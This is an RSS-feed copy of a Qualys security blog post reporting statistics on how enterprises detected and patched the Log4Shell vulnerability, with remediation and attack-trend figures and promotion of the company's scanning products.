srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/30-percent-vulnerable-1070x294.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/30-percent-vulnerable-300x83.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/30-percent-vulnerable-768x211.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/30-percent-vulnerable.png 1440w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h4>Log4Shell Exposure</h4>



<ul><li>Qualys Cloud Platform scanned more than 150 million IT assets, across all geographies, flagging 22 million vulnerable app installations. Of these, more than 80% were open source applications.</li><li>Log4Shell was detected in more than 3 million vulnerable instances.</li><li>More than two months later, 30% of Log4j instances remain vulnerable for exploit.<a href="#1"><sup>[1]</sup></a></li></ul>



<h4>Log4Shell Threat Landscape</h4>



<ul><li>Nearly 68,000 vulnerabilities were found in cloud workloads and containers across the US and EMEA, reinforcing the recommendation that enterprises need to monitor running containers for flaws like Log4Shell.</li><li><a href="https://github.com/cisagov/log4j-affected-db/blob/develop/SOFTWARE-LIST.md">CISA</a> and<a href="https://github.com/NCSC-NL/log4shell/blob/main/software/README.md"> NCSC</a> reported 1,495 products vulnerable to Log4Shell, and of those we observed 1,065 products across 52 publishers currently in use. This indexing proved very valuable to Qualys customers as this SBOM mapping is provided out of the box, providing immediate insights into their vulnerable software inventory.</li><li>Surprisingly, more than 50% of application installations with Log4j were flagged as “end-of-support&#8221;.  This means that these publishers will likely NOT be providing Log4Shell security patches for these apps.</li><li>The vulnerability was detected in more than 2,800 web applications. Since web apps are publicly facing, this was the first line of defense for many enterprises looking to fend off early attacks. In the U.S., most detections occurred before/during the holiday period, while in the E.U. these spiked after the holidays.</li></ul>



<figure class="wp-block-image size-large"><img data-attachment-id="29728" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/qualys-study-reveals-how-enterprises-responded-to-log4shell/attachment/50-percent-end-of-support" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/50-percent-end-of-support.png" data-orig-size="1440,398" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="50-percent-end-of-support" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/50-percent-end-of-support-300x83.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/50-percent-end-of-support-1070x296.png" loading="lazy" width="1070" height="296" src="https://blog.qualys.com/wp-content/uploads/2022/03/50-percent-end-of-support-1070x296.png" alt="" class="wp-image-29728" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/50-percent-end-of-support-1070x296.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/50-percent-end-of-support-300x83.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/50-percent-end-of-support-768x212.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/50-percent-end-of-support.png 1440w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h4>Vulnerability Trends</h4>



<ul><li>The vast majority of the vulnerable assets (over 80%) were on Linux.</li><li>A total of 98 distinct log4j versions were observed in use, 55% of which were vulnerable versions.</li><li>There was a 20% spike in detections as the New Year arrived and employees returned to work.</li><li>Within the first month after Log4Shell’s disclosure, we observed that 12% of total log4j installations were vulnerable, while only 5% were not.</li></ul>



<figure class="wp-block-image size-large"><img data-attachment-id="29729" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/qualys-study-reveals-how-enterprises-responded-to-log4shell/attachment/17-days-remediate" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/17-days-remediate.png" data-orig-size="1440,397" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="17-days-remediate" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/17-days-remediate-300x83.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/17-days-remediate-1070x295.png" loading="lazy" width="1070" height="295" src="https://blog.qualys.com/wp-content/uploads/2022/03/17-days-remediate-1070x295.png" alt="" class="wp-image-29729" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/17-days-remediate-1070x295.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/17-days-remediate-300x83.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/17-days-remediate-768x212.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/17-days-remediate.png 1440w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h4>Remediation Trends</h4>



<ul><li>Average time to remediation after detection was 17 days. Systems which could be exploited remotely were patched faster (12 days) while internal systems were slower.</li><li>After the first month, remediation efforts plateaued and began trending down, quite likely because security teams are finding it easier to mitigate Log4Shell rather than permanently fixing it.</li></ul>



<figure class="wp-block-image size-large"><img data-attachment-id="29730" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/qualys-study-reveals-how-enterprises-responded-to-log4shell/attachment/22k-per-week-attacks" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/22k-per-week-attacks.png" data-orig-size="1440,397" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="22k-per-week-attacks" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/22k-per-week-attacks-300x83.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/22k-per-week-attacks-1070x295.png" loading="lazy" width="1070" height="295" src="https://blog.qualys.com/wp-content/uploads/2022/03/22k-per-week-attacks-1070x295.png" alt="" class="wp-image-29730" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/22k-per-week-attacks-1070x295.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/22k-per-week-attacks-300x83.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/22k-per-week-attacks-768x212.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/22k-per-week-attacks.png 1440w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h4>Attack Patterns</h4>



<ul><li>Our threat intelligence research team observed attempted ransomware attacks by Conti, Khonsari, and nation state-backed adversaries based on Log4Shell, as reported by<a href="https://venturebeat.com/2021/12/22/log4j-flaw-gets-big-attention-from-ruthless-ransomware-gang/"> <em>VentureBeat.</em></a></li><li>Our<a href="https://www.qualys.com/apps/endpoint-detection-response/"> Multi-Vector EDR solution</a> detected 22,000 potential attacks per week at the height of the crisis. Many of these were scattershot “spray &amp; pray” attacks trying to infect as many systems as possible quickly. Our data indicates that threat actors were trying to take advantage of the holiday season window of opportunity.</li><li>Attacks also trended down into January, as mitigating controls and patches were rolled out by enterprise IT teams. </li></ul>



<p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/infographic-log4shell-vulnerability-impact-by-the-numbers">View the full infographic</a></p>



<p>Within 24 hours, the Qualys Research Team had<a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/12/10/apache-log4j2-zero-day-exploited-in-the-wild-log4shell"> published its findings</a> and launched<a href="https://www.qualys.com/log4shell-cve-2021-44228/"> a Log4Shell resource center</a> to keep the industry updated. We released over 70 vulnerability detections and continued to release more as vendors released patches for their vulnerabilities. We hosted a series of webcasts for customers and non-customers alike on the steps we recommended for remediation.</p>



<p>Given the ubiquity of Log4Shell, we realized that having more enterprises detect it quicker would benefit the entire cybersecurity community. With this in mind, Qualys developed a new<a href="https://github.com/Qualys/log4jscanwin"> open source Log4j scanning utility</a> to save security teams valuable time. To help enterprises quickly detect and remediate these vulnerabilities we offered complimentary access to our unified security and compliance platform for 30 days.</p>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Quickly identify Log4Shell vulnerabilities using our cloud platform</strong></strong></p>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/web-application-scanning-log4shell/" style="background-color:#ed2e26">Try it Now</a></div>



<hr class="wp-block-separator is-style-wide"/>



<h4>Conclusion</h4>



<p>Thankfully, critical vulnerabilities as severe as Log4Shell are a rare occurrence. However, the future discovery of another weakness just as bad (or worse) is inevitable. That’s why all enterprises, large and small, are well advised to invest in a best-in-class platform solution that can aid security operations, IT asset management, vulnerability detection and response, cloud security, EDR/XDR, and web app protection. CxOs should make sure that their security and IT Ops teams have a unified view of the organization’s risk posture. Real-time threat intelligence like that from the Qualys knowledgebase helps enterprises to continuously assess, monitor and report on the latest and greatest security threats so that, when “next time” inevitably arrives, we’ll be ready.</p>



<h4 id="1">Footnotes</h4>



<ol><li>does not account for any mitigations applied</li></ol>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/qualys-study-reveals-how-enterprises-responded-to-log4shell/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Vice President of Product Management, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/5e24742536cd3deb6cdf9fefb16a162d?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/mrevankar]]></authorPosts>
      <postCategory>
        <name><![CDATA[Vulnerabilities and Threat Research]]></name>
        <link><![CDATA[https://blog.qualys.com/category/vulnerabilities-threat-research]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p>On December 9, 2021, a critical zero-day vulnerability affecting Apache’s Log4j2 library, a Java-based logging utility, was disclosed to the world. This was no small announcement. As the third most used computer language, Java is practically ubiquitous. Its Log4j2 library is extremely popular. Billions of devices around the globe currently run Java. Most enterprises likely have multiple versions of it running throughout their computing systems.</p>



<p>This new weakness discovered in Java was soon given a name: Log4Shell. In the cybersecurity hall of fame – one that includes nasty past exploits like HeartBleed, WannaCry, and ShellShock – Log4Shell was found to be in a league all its own. Difficult to locate but easy to exploit, it was clear that this vulnerability would have a massive impact across nearly every industry&#8230; hitting only two weeks before the holidays.</p>



<h3>The Cybersecurity Industry Springs into Action</h3>



<p>It didn’t take very long for this critical Java vulnerability to be exploited in the wild. Nearly<a href="https://www.itpro.co.uk/security/zero-day-exploit/361847/log4shell-zero-day-vulnerability-numbers-revealed"> 1 million attack attempts</a> were launched in just 72 hours following the Log4Shell vulnerability&#8217;s disclosure.</p>



<p>There was no time to waste. The bad guys didn’t care that it was the holiday season. With many companies preparing to operate with skeleton IT staffing during the final two weeks of 2021, hackers and attackers saw an opportunity. The race was on.</p>



<p>Qualys was among the<a href="https://www.qualys.com/log4shell-cve-2021-44228/"> first industry players</a> to analyze the threat and develop effective countermeasures to mitigate this dangerous new vulnerability. Our<a href="https://www.qualys.com/cloud-platform/"> Qualys Cloud Platform</a> is a unified cybersecurity and compliance solution comprised of a suite of<a href="https://www.qualys.com/apps/"> specialized cloud apps</a> that help global enterprises manage their vulnerabilities, threats, and exploits.</p>



<p>We’ve indexed more than 10 trillion datapoints across our installed enterprise customer base and completed 6 billion IP scans per year with 75 million cloud agents deployed in hybrid IT environments globally. With that kind of scale, Qualys occupies a unique vantage point capable of ferreting out Log4Shell wherever it hides.</p>



]]></customExcerpt>
    </item>
  </channel>
</rss>